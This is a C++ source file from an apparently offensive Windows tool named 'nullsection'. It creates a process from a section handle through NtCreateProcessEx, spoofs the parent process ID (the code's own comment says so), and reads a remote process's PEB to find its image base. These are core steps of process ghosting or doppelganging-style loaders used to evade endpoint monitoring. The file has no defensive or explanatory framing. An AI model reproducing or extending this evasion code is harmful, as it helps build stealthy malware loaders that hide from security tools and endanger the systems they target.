#include "process/process_factory.hpp"
#include "core/nt_api.hpp"
#include "utils/exceptions.hpp"
#include "utils/logging.hpp"
#include "utils/ntstatus.hpp"
#include <stdexcept>

namespace nullsection::process {

utils::Handle ProcessFactory::CreateProcessFromSection(HANDLE sectionHandle,
                                                       HANDLE parentProcess) {
  if (!sectionHandle || sectionHandle == INVALID_HANDLE_VALUE) {
    throw utils::NullSectionException(
        "Invalid section handle provided to ProcessFactory.");
  }

  HANDLE hProcess = nullptr;
  // PPID Spoofing: Use the provided parentProcess handle directly
  HANDLE parent = parentProcess ? parentProcess : GetCurrentProcess();

  NTSTATUS status = core::NtApi::Instance().NtCreateProcessEx(
      &hProcess, PROCESS_ALL_ACCESS, nullptr, parent, 0, sectionHandle, nullptr,
      nullptr, 0);

  if (status != 0) {
    std::string ntStatusStr = utils::NtStatusTranslator::ToString(status);
    utils::Logger::Log(utils::LogLevel::ERROR,
                       "NtCreateProcessEx failed: " + ntStatusStr);
    throw utils::NtException("NtCreateProcessEx failed", status);
  }

  if (!hProcess) {
    throw utils::NullSectionException(
        "NtCreateProcessEx returned success but process handle is null.");
  }

  return utils::Handle(hProcess);
}

PVOID ProcessFactory::GetRemoteImageBase(HANDLE processHandle) {
  PROCESS_BASIC_INFORMATION pbi;
  ULONG returnLength = 0;

  NTSTATUS status = core::NtApi::Instance().NtQueryInformationProcess(
      processHandle, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);

  if (status != 0) {
    throw utils::NtException("Failed to query process information", status);
  }

  PPEB pPeb = pbi.PebBaseAddress;
  PVOID imageBase = nullptr;

  if (!ReadProcessMemory(processHandle, (PBYTE)pPeb + 0x10, &imageBase,
                         sizeof(PVOID), nullptr)) {
    throw utils::Win32Exception("Failed to read remote PEB for ImageBase",
                                GetLastError());
  }

  return imageBase;
}

} // namespace nullsection::process
